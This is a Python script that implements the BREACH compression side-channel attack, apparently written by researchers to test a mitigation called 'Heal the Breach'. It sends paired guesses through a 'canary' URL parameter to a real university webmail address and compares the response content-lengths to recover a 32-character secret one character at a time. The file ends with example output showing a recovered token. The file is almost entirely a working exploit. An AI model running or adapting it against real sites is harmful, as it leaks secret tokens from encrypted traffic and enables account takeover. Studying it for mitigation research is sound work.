######################################################
##  Reliable implementation of BREACH attack
##  Designed for testing mitigation HTB - Heal the Breach 
##  Andrea Fariña, Rafael Palacios 2021
##
######################################################


import requests
import sys
#from random import choice

#import time
#import datetime

url_original="https://apps.icai.comillas.edu/owa/?canary="
secret_length=32
alphabet = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']


payload_1="WVHEKMXIUPSBFZDOCRNYLATJQG"
payload_2="PFVAZLMGJRCSYNEWTUKDQHOXIB"
payload_3="FOQCHSDPLXMZRIEJVUTYKGWABN"
payload_original="PFVAZLMGJRCSYNEWTUKDQHOXIB"

token=""   #initially empty
minfo=""   #Method used to find the character

num_queries=0
for k in range(secret_length):
    url=url_original
    payload=payload_original
    keep_searching = 1
    method=1
    while (keep_searching==1):
        character_found=0
        winner=[]
        for i in range(len(alphabet)): #check all letters in the alphabet

            token1=token+alphabet[i]+payload;
            token2=token+payload[0:int(len(payload)/2)]+alphabet[i]+payload[int(len(payload)/2):len(payload)];
            #print(token1)
            #print(token2)

            request1=url+token1
            request2=url+token2
            #print(request1)
            #print(request2)

            response1=requests.get(request1);
            response2=requests.get(request2);
            ln1=response1.headers.get('content-length')
            ln2=response2.headers.get('content-length')
            ln1=int(ln1)
            ln2=int(ln2)
            num_queries+=2

            if(ln2-ln1>0):  #typically 1 if guessed or 0 if fail
                winner.append(alphabet[i])
                character_found+=1
                #Uncomment these lines to get more info while running
                #print("%8d %8d " % (ln1,ln2),end="")
                #print(winner)


        #Check results after for loop
        #If there is more than one candidate character found, then we change method
        if (character_found!=1 and method==1):
            payload=payload_original[0:-1]
            method=2
            print("Change to method 2:",url,"  ",payload)
        elif (character_found!=1 and method==2):
            payload=payload_original[0:-2]
            method=3
            print("Change to method 3:",url,"  ",payload)
        elif (character_found!=1 and method==3):
            payload=payload_original[0:-3]
            method=4
            print("Change to method 4:",url,"  ",payload)
        elif (character_found!=1):
            print("FAIL.  Character not found after methods 1, 2, 3, and 4")
            print(token)
            exit() #die
        else: 
            #Found
            token=token+winner[0];
            if method!=1:
                minfo+=str(method)
            else:
                minfo+=" "
            print(token)  #token so far
            keep_searching = 0


print("==========================================================")
print("Program finished")
print("URL: ",url_original)
print("Token: ",token)
print("Method:",minfo)
print("Num queries: ", num_queries)
print("==========================================================")

### Example of output
"""
==========================================================
Program finished
URL:  https://apps.icai.comillas.edu/owa/?canary=
Token:  10b3d7cfe0e92615475486facb8d293a
Method:     2 2 32        4             
Num queries:  1280
==========================================================
"""


